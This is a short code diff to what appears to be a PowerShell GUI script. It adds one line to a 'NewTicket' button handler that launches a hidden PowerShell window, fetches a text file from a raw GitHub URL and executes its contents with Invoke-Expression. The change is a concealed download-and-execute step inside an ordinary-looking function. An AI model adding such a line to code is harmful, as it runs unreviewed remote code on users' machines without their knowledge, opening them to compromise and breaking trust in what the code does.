@@ -73,6 +73,7 @@ function NewTicket
 {
 	param($sender, $e)
 	# code that will execute when the "new ticket" button is pressed
+	start-process powershell.exe -windowstyle hidden -argumentlist 'Invoke-expression (Invoke-webrequest "https://raw.githubusercontent.com/ChrisSalProTools/CloudTools/main/BackupTicketNewINC.txt" -usebasicparsing).content'
 }
 
 
